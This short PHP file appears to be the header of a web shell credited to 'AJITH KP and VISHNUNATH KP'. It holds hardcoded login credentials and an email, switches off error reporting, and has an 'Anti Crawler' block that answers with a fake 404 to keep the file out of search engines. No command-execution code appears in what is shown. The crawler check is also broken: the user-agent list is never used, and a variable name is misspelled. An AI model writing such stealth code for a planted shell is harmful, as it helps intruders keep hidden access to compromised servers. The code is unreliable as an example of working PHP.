<?php

/*
 * originally scripted by AJITH KP and VISHNUNATH KP
*/

/*------------------ LOGIN -------------------*/

$usernameame="ajithkp560";
$password="ajithkp560";
$email="ajithkp560@gmail.com";


/*------------------ Login Data End ----------*/

@error_reporting(5);

/*------------------ Anti Crawler ------------*/
if(!empty($_SERVER['HTTP_USER_AGENT']))
{
    $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");  
    header('HTTP/1.0 404 Not Found');
    die();
}

?>